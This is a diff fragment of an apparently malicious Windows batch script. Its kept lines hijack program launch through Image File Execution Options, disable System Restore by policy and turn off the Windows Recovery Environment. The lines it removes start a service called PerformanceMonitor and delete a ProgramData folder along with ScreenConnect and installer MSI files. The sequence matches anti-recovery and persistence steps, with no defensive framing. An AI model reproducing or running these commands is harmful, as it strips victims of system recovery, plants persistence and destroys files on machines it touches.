@@ -39,7 +39,3 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f
 reagentc /disable
-sc start PerformanceMonitor
-rd /s /q "%ProgramData%\bist"
-del /f /q "%WINDIR%\SystemTemp\ScreenConnect\25.2.4.9229\*.msi"
-del /f /q "%WINDIR%\Installer\*.msi"
